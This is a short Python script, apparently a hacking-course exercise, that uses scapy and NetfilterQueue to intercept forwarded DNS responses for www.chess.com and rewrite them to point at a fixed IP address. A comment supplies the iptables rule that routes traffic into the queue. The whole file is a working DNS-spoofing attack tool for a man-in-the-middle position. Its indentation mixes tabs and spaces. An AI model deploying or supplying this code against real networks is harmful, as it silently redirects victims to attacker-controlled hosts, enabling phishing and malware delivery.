import scapy.all as scapy
from netfilterqueue import NetfilterQueue

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
	if "www.chess.com" in qname:
		print "[+] Spoofing target"
		answer = scapy.DNSRR(rrname=qname, rdata="108.174.11.49")#we change those two values 
		scapy_packet[scapy.DNS].an =  answer  #at dns group get the an  field
		scapy_packet[scapy.DNS].ancount = 1 # number of answers
		
		#We delete those so scapy will rebuild them for our own answer
		del scapy_packet[scapy.IP].len
		del scapy_packet[scapy.IP].chksum
		del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

		packet.set_payload(str(scapy_packet))
    	
    packet.accept()

    
queue = NetfilterQueue()
queue.bind(0, process_packet)#we bind to a queue this time is the 0 queue
#queues can be made using iptables like so: iptables -I FORWARD -j NFQUEUE --queue-num 0
queue.run()
